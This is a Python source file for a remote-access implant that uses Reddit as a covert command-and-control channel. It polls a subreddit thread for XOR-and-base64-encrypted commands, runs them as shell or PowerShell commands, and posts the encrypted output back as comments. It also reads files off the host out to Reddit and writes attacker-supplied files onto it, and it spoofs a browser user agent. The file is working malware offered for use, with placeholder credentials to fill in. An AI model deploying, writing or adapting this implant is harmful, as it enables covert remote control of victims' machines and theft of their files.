import praw
import time
import subprocess
import base64

#Function to convert base64 to file
def base64_to_file(base64_string, filename):
    # decode the base64 string
    decoded_data = base64.b64decode(base64_string).decode('utf-8')
    # write the data to the file
    with open(filename, 'wb') as f:
        f.write(decoded_data.encode())

#Function to encode a file to base64
def encode_file_in_base64(filepath):
    with open(filepath, 'rb') as file:
        file_data = file.read()
    return base64.b64encode(file_data).decode('utf-8')

#Function to xor encrypt a string
def xor_encrypt(plaintext, key):
    encrypted_text = ""
    for i in range(len(plaintext)):
        encrypted_text += chr(ord(plaintext[i]) ^ ord(key[i % len(key)]))
    return encrypted_text

#Function to base64 encode the string
def base64_encode(plaintext):
    return base64.b64encode(plaintext.encode())

#Function to encrypt the string
def encrypt(plaintext, key):
    encrypted_text = xor_encrypt(plaintext, key)
    return base64_encode(encrypted_text)

#Decryption

#Function to base64 decode the string
def base64_decode(encoded_text):
    return base64.b64decode(encoded_text).decode()

#Function to xor decrypt the string
def xor_decrypt(plaintext, key):
    decrypted_text = ""
    for i in range(len(plaintext)):
        decrypted_text += chr(ord(plaintext[i]) ^ ord(key[i % len(key)]))
    return decrypted_text

#Function to decrypt the string
def decrypt(encoded_text, key):
    decoded_text = base64_decode(encoded_text)
    return xor_decrypt(decoded_text, key)


class Implant:
    
    def __init__(self, client_id, client_secret, username, password, subreddit_name, listener_name, user_agent, xor_key):
        self.client_id = client_id
        self.client_secret = client_secret
        self.username = username
        self.password = password
        self.subreddit_name = subreddit_name
        self.listener_name = listener_name
        self.user_agent = user_agent
        self.xor_key = xor_key
        self.listener_id = None
        self.submission = None
        self.comment_id = None
        self.__reddit = None
        self.__subreddit = None
    
    @property
    # creating an authorized reddit instance
    def reddit(self):
        if self.__reddit is None:
            self.__reddit = praw.Reddit(
                client_id = self.client_id,
                client_secret = self.client_secret,
                username = self.username,
                password = self.password,
                user_agent = self.user_agent
                )
            self.__reddit.validate_on_submit = True
        return self.__reddit
    
    @property
    def subreddit(self):
        if self.__subreddit is None:
            self.__subreddit = self.reddit.subreddit(self.subreddit_name)
        return self.__subreddit
    
    def verifySession(self):
        for submission in self.subreddit.top(time_filter='all'):
            if(submission.title == self.listener_name):
                self.submission = submission
        return self.submission

    #read a post with a specific title
    def readTask(self):
        victim_responses = []

        while not victim_responses:
            #look only for comments which has our command in it
            self.verifySession()
            self.submission.comments.replace_more(limit=None)
            for top_level_comment in self.submission.comments:
                if("in:" in top_level_comment.body):
                    self.comment_id = top_level_comment.id
                    victim_responses.append(top_level_comment.body)
            
        response = victim_responses[0]
        response = response[6:-1]
        
        #decrypt the message
        ciphertext = decrypt(str(response), xor_key)
            
        if "powershell" in ciphertext:
            ciphertext = "powershell.exe " + ciphertext[11:]
        elif "run" in ciphertext:
            ciphertext = ciphertext[4:]
            
        print("[+] Received task to execute: " + ciphertext)
        return ciphertext

    def sendOutput(self, output,):
        #encrypt the output which is about to be sent as a reply
        ciphertext = encrypt(output, self.xor_key)

        comment = self.reddit.comment(self.comment_id)
        comment_body = comment.body
        new_comment_body = comment_body.replace('in', 'executed')
        comment.edit(new_comment_body)
        comment.reply("out: " + str(ciphertext))
        print('[*] Task output sent.')
        time.sleep(5)

    
def runTask(command):
    output = subprocess.getoutput(command)
    return output


if __name__ == "__main__":
    #fill in the data with your credentials
    #-------------------------------------
    client_id = "myclientid"
    client_secret = "mysecretkey"
    username = "myusername"
    password = "mypassword"
    subreddit = "mysubreddit"
    listener_name = "listener_name"
    xor_key = "myxorkey"
    #-------------------------------------
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"

    i = Implant(client_id, client_secret, username, password, subreddit, listener_name, user_agent, xor_key)
    listener_session = i.verifySession()
    if listener_session:
        print("[+] Entered the session")
    else:
        print("[!] Listener session not found")

    while True:
        time.sleep(5)
        command = i.readTask()
        if command == 'exit':
            print('[*] Exiting...')
            i.sendOutput('Implant terminated.')
            exit()
        
        if(command[:8] == "download"):
            filename = command[9:] #save filename
            output = encode_file_in_base64(filename)
            if(len(output) > 10000):
                i.sendOutput("[!] File is too large (" + str(len(output)) + "/10000 available characters)")
            else:
                i.sendOutput(output)
        
        elif(command[:6] == "upload"):
            base64_to_file(command.split()[2], command.split()[1])
            i.sendOutput("[+] File uploaded successfully")
        
        else:
            output = runTask(command)
            i.sendOutput(output)
